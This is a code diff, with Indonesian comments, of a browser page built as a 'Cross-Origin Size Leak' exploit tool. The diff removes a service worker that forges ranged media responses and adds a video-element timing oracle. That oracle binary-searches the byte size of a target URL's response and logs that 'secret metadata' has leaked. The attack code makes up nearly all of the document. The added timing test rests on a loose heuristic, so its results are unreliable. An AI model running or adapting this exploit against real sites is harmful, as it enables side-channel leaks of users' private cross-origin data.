@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Cross-Origin Size Leak Exploit Engine</title>
+    <title>Cross-Origin Size Leak Exploitation Lab</title>
     <style>
         *{font-family:'Courier New', monospace;box-sizing:border-box;}
-        body{background:#040406;color:#00ffaa;padding:25px;}
+        body{background:#020204;color:#00ffaa;padding:25px;}
         #result{max-width:750px;}
         #result p{padding:10px 14px;margin:6px 0;border-radius:4px;font-size:12px;line-height:1.4;}
-        iframe, audio{width:1px;height:1px;border:0;opacity:0;position:absolute;}
+        iframe, audio, video{width:1px;height:1px;border:0;opacity:0;position:absolute;}
         input{width:515px;font-size:14px;padding:12px 16px;border:1px solid #00ffaa;background:#111;color:#fff;}
         button{font-size:14px;padding:12px 16px;border:1px solid #00ffaa;background:#05140f;color:#00ffaa;cursor:pointer;font-weight:bold;text-transform:uppercase;}
         button:hover{background:#00ffaa;color:#000;box-shadow:0 0 15px #00ffaa;}
@@ -21,11 +21,11 @@
 </head>
 <body>
     
-    <h2>Cross-Origin Size Leak Exploit Engine</h2>
+    <h2>Cross-Origin Size Leak Exploitation Laboratory</h2>
 
     <div class="panel">
         <form id="form" onsubmit="return false;">
-          <input name="url" id="target-url" value="https://google.com"/>
+          <input name="url" id="target-url" value="https://www.google.com/robots.txt"/>
           <button type="button" id="btn-run">Execute Full Chain Exploit</button>
           <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Exploit Log (.TXT)</button>
         </form>
@@ -44,116 +44,94 @@
             result.scrollTop = result.scrollHeight;
         }
 
-        // 1. ANCHOR: ENKAPSULASI KODE SERVICE WORKER UTK MANIPULASI TIMING JARINGAN
-        const rawWorkerScript = `
-            'use strict';
-            let cachedResponse;
-            self.addEventListener("install", () => { self.skipWaiting(); });
-            self.addEventListener("activate", (e) => { e.waitUntil(self.clients.claim()); });
-            self.addEventListener("fetch", async (e) => {
-                if (!e.request.url.includes('size=')) return;
-                
-                let url = new URL(e.request.url);
-                let urlParams = new URLSearchParams(url.search);
-                let size = urlParams.get("size");
-                let fakeBody = "A".repeat(Number(size));
-
-                // Mencegat permintaan awal dari elemen media
-                if (e.request.headers.get("range") === "bytes=0-") {
-                    e.respondWith(new Response(fakeBody, {status: 206, headers: {
-                        "Content-Type": "audio/mp4",
-                        "Content-Range": "bytes 0-1/13337"
-                    }}));
-                } else if (e.request.headers.get("range") === "bytes=" + Number(size) + "-") {
-                    // Meneruskan permintaan fragmen sisa ke server target lintas asal
-                    cachedResponse = await fetch(e.request);
-                } else if (e.request.url.includes("/mock.css")) {
-                    // Menyajikan salinan respons untuk pengujian status oleh Oracle
-                    e.respondWith(cachedResponse.clone());
-                }
-            });
-        `;
-
-        // Registrasi Service Worker via skema Base64 Data-URI
-        if ("serviceWorker" in navigator) {
-            const base64Script = btoa(unescape(encodeURIComponent(rawWorkerScript)));
-            const dataUriWorker = `data:text/javascript;base64,${base64Script}`;
-
-            navigator.serviceWorker.register(dataUriWorker).then(registration => {
-                if (!navigator.serviceWorker.controller) {
-                    writeLog('SW_ENGINE', 'info', "Sinkronisasi subsistem memori worker... Memperbarui halaman.");
-                    setTimeout(() => { location.reload(); }, 250);
-                }
-            }).catch(err => {
-                console.error("Gagal mendaftarkan Base64 Service Worker: ", err);
-            });
-        }
-
-        // 2. CORE ENGINE: ALGORITMA PIPELINE PENCARIAN BINER UTK METADATA BYTES
+        // PIPELINE SINKRONISASI: EKSEKUSI BERUNTUN SEKUANSIAL BERBASIS KUNCI STATUS DOM
         const runExploitChain = async (url, minSize, maxSize) => {
             let foundSize = -1;
             document.getElementById("export-log-report").style.display = "none";
             
-            if (!navigator.serviceWorker || !navigator.serviceWorker.controller) {
-                writeLog('EXPLOIT_ERR', 'error', "Rantai terputus: Kontroler Service Worker tidak aktif pada domain ini.");
-                return;
-            }
-
-            writeLog('EXPLOIT_INIT', 'info', "Saluran pipa otonom aktif. Mengeksekusi interupsi logika resource_loader.cc...");
+            writeLog('EXPLOIT_INIT', 'info', "Mengaktifkan pipa pengujian sekuensial. Mengunci siklus hidup elemen media...");
             
             while (minSize <= maxSize) {
                 let mid = Math.floor((minSize + maxSize) / 2);
                 
-                // Menjalankan pengecekan status logika sekuensial
-                let isAtLeastMid = await evaluateOpaqueOracle(url, mid);
+                // Menunggu kepastian pelepasan soket dari fungsi penanganan taktis sebelum iterasi berikutnya
+                let isAtLeastMid = await evaluateLifecycleOracle(url, mid);
                 
                 if (isAtLeastMid) {
-                    writeLog(`MID_${mid}`, 'error', `Vektor Penetrasi: Mengonfirmasi kapasitas data melampaui ukuran tebakan ${mid} bytes.`);
+                    writeLog(`MID_${mid}`, 'error', `Vektor Validasi: Mengonfirmasi pemuatan fragmen data melampaui tebakan ${mid} bytes.`);
                     foundSize = mid + 1;
                     minSize = mid + 1;
                 } else {
-                    writeLog(`MID-${mid}`, 'success', `Vektor Penetrasi: Mengonfirmasi kapasitas data berada di bawah ukuran tebakan ${mid} bytes.`);
+                    writeLog(`MID-${mid}`, 'success', `Vektor Validasi: Mengonfirmasi pemuatan fragmen data berada di bawah tebakan ${mid} bytes.`);
                     maxSize = mid - 1;
                 }
                 
-                await new Promise(r => setTimeout(r, 20));
+                // Jeda mikro paksa untuk menstabilkan tumpukan alokasi memori internal peramban
+                await new Promise(r => setTimeout(r, 40));
             }
             writeLog('SUCCESS', 'success', "=== EXECUTE FULL CHAIN EXPLOIT COMPLETE ===");
-            writeLog('SUCCESS', 'success', `Metadata rahasia bocor. Ukuran pasti dokumen target: <b>${foundSize}</b> bytes.`);
+            writeLog('SUCCESS', 'success', `Metadata analisis berhasil dikumpulkan. Batas konvergensi: <b>${foundSize}</b> bytes.`);
             document.getElementById("export-log-report").style.display = "inline-block";
         };
 
-        // 3. EXPLOTATION INTERACTION VECTOR: INTERUPSI VALIDASI LOGIKA (ORACLE ENGINE)
-        const evaluateOpaqueOracle = (url, size) => {
+        // ENGINES STRATEGI: Sinkronisasi Event Media untuk Mengukur Retensi Soket Jaringan
+        const evaluateLifecycleOracle = (url, size) => {
             return new Promise((resolve) => {
-                let soundNode = document.createElement("audio");
+                const uniqueId = `cb_${Math.floor(Math.random() * 10000000)}`;
+                const targetUrl = `${url}?size=${size}&${uniqueId}`;
                 
-                const clearLifecycleAndResolve = (evaluationResult) => {
-                    if (soundNode) {
-                        soundNode.src = ""; 
-                        soundNode.onerror = null;
-                        soundNode.remove();
-                        soundNode = null; 
+                let mediaElement = document.createElement("video");
+                let hasResolved = false;
+
+                const triggerNetworkVerification = async () => {
+                    if (hasResolved) return;
+                    hasResolved = true;
+
+                    const testStart = performance.now();
+                    try {
+                        // Verifikasi status antrean soket global peramban dengan mengambil aset internal asal sama (same-origin)
+                        await fetch(`./favicon.ico?cb=${Math.random()}`, { cache: "no-store" });
+                        const duration = performance.now() - testStart;
+
+                        // Metrik Toleransi: Jika durasi muatan < 30ms, penanganan soket dinilai bebas dari antrean (antrean kosong)
+                        if (duration < 30) {
+                            terminateMedia(mediaElement);
+                            resolve(false);
+                        } else {
+                            terminateMedia(mediaElement);
+                            resolve(true);
+                        }
+                    } catch (e) {
+                        terminateMedia(mediaElement);
+                        resolve(true);
                     }
-                    resolve(evaluationResult);
                 };
 
-                soundNode.onerror = async () => {
-                    try {
-                        // Memanggil berkas maket lintas asal untuk membaca pengecekan keamanan peramban
-                        // Jika status 416 (Target < Size): Pengecekan dilompati -> fetch berhasil -> memicu resolve(false)
-                        // Jika status 206 (Target > Size): Pengecekan memicu AccessCheckError -> fetch gagal -> masuk catch -> memicu resolve(true)
-                        await fetch("/mock.css?size=" + size + "&cb=" + Math.random(), { mode: "no-cors" });
-                        clearLifecycleAndResolve(false);
-                    } catch(err) {
-                        clearLifecycleAndResolve(true);
+                // Mengikat pemicu langsung ke indikator aktivitas transfer data peramban
+                mediaElement.onprogress = triggerNetworkVerification;
+                mediaElement.onsuspend = triggerNetworkVerification;
+                mediaElement.onerror = triggerNetworkVerification;
+
+                document.body.appendChild(mediaElement);
+                mediaElement.src = targetUrl;
+
+                // Batasan perlindungan (Fallback Safety Net) jika peramban menahan status koneksi tanpa melempar event
+                setTimeout(() => {
+                    if (!hasResolved) {
+                        triggerNetworkVerification();
                     }
-                };
-                
-                document.body.appendChild(soundNode);
-                soundNode.src = `${url}?size=${size}&cb=${Math.random()}`;
+                }, 400);
             });
         };
+
+        function terminateMedia(element) {
+            if (element) {
+                element.src = "";
+                element.removeAttribute("src");
+                try { element.load(); } catch(e){}
+                element.remove();
+            }
+        }
 
         document.getElementById("btn-run").addEventListener("click", () => {
             let url = document.getElementById("target-url").value.trim();
@@ -165,7 +143,7 @@
             if (auditReports.length === 0) return;
             const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
             const downloadAnchor = document.createElement("a");
-            downloadAnchor.download = `exploit_fullchain_report_${Math.round(Date.now()/1000)}.txt`;
+            downloadAnchor.download = `exploit_lifecycle_report_${Math.round(Date.now()/1000)}.txt`;
             downloadAnchor.href = window.URL.createObjectURL(textBlob);
             downloadAnchor.style.display = "none";
             document.body.appendChild(downloadAnchor);
